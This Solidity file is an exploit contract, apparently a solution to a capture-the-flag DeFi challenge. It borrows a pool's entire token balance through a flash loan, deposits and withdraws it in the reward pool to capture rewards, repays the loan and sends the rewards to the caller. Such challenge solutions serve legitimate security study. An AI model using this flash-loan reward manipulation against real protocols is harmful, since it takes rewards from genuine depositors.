// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";

contract RewarderExploit {
    uint256 public amount = 0;
    FlashLoanerPool public flashLoan;
    TheRewarderPool public pool;
    IERC20 public rewardToken;
    IERC20 public liquidityToken;

    function runExploit(FlashLoanerPool  _flashLoan, TheRewarderPool  _pool, IERC20 _rewardToken, IERC20 _liquidityToken, uint256 _amount) external {
      flashLoan = _flashLoan;
      pool = _pool;
      rewardToken = _rewardToken;
      liquidityToken = _liquidityToken;
      amount = liquidityToken.balanceOf(address(flashLoan));
      flashLoan.flashLoan(amount);
      uint256 rewardBalance = rewardToken.balanceOf(address(this));
      rewardToken.transfer(msg.sender,rewardBalance);

    }

    function receiveFlashLoan(uint256 _receivedAmount) external {
      liquidityToken.approve(address(pool), amount);
      pool.deposit(amount);
      pool.withdraw(amount);
      liquidityToken.transfer(address(flashLoan), amount);
    }

}